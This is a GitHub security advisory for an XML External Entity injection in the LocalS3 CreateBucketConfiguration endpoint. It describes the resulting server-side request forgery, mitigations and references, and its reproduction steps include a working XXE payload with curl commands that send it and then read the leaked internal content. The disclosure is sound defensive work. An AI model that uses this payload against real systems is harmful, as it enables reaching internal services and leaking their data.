# [M] LocalS3 CreateBucketConfiguration Endpoint XML External Entity (XXE) Injection

## Summary
Severity: Medium
Advisory: GHSA-g6wm-2v64-wq36
CVE: CVE-2025-27136
CWE: CWE-611
Ecosystem: Maven
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N/E:P (CVSS_V4)
Published: 2025-03-10
Source: https://github.com/advisories/GHSA-g6wm-2v64-wq36
Type: github-advisory

## Affected
- Maven: `io.github.robothy:local-s3-rest` — affected >=0 <1.21

## Details
## Description

The LocalS3 service's bucket creation endpoint is vulnerable to XML External Entity (XXE) injection. When processing the CreateBucketConfiguration XML document during bucket creation, the service's XML parser is configured to resolve external entities. This allows an attacker to declare an external entity that references an internal URL, which the server will then attempt to fetch when parsing the XML.

The vulnerability specifically occurs in the location constraint processing, where the XML parser resolves external entities without proper validation or restrictions. When the external entity is resolved, the server makes an HTTP request to the specified URL and includes the response content in the parsed XML document.

This vulnerability can be exploited to perform server-side request forgery (SSRF) attacks, allowing an attacker to make requests to internal services or resources that should not be accessible from external networks. The server will include the responses from these internal requests in the resulting bucket configuration, effectively leaking sensitive information.

## Steps to Reproduce

1. Create an XML document that includes an external entity declaration pointing to the internal target:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://internal-web/flag.txt"> ]>
<CreateBucketConfiguration>
    <LocationConstraint>&xxe;</LocationConstraint>
</CreateBucketConfiguration>
```

2. Send a PUT request to create a new bucket with this configuration:
```bash
curl -X PUT http://app/test-bucket-2 -H 'Content-Type: application/xml' -d @payload.xml
```

3. Retrieve the bucket location to see the resolved entity content:
```bash
curl http://app/test-bucket-2/?location
```

When these steps are executed, the server processes the XML, resolves the external entity by making a request to the internal URL, and includes the response in the bucket's location constraint. The attacker can then retrieve this information through the bucket location endpoint.

## Mitigations

- Disable XML external entity resolution in the XML parser configuration. Most XML parsers have options to disable external entity processing.
- Implement proper input validation for XML documents, rejecting those that contain DOCTYPE declarations or external entity references.
- Use XML parsers that are configured securely by default and don't process external entities.
- If external entity processing is required, implement a whitelist of allowed URLs and validate all URLs before making any requests.

## Impact

The vulnerability allows unauthenticated attackers to make the server perform HTTP requests to internal networks and services, potentially exposing sensitive information or enabling further attacks against internal systems. The attacker only needs to be able to send HTTP requests to the LocalS3 service to exploit this vulnerability.

## References
- https://github.com/Robothy/local-s3/security/advisories/GHSA-g6wm-2v64-wq36
- https://nvd.nist.gov/vuln/detail/CVE-2025-27136
- https://github.com/Robothy/local-s3/commit/d6ed756ceb30c1eb9d4263321ac683d734f8836f
- https://github.com/Robothy/local-s3
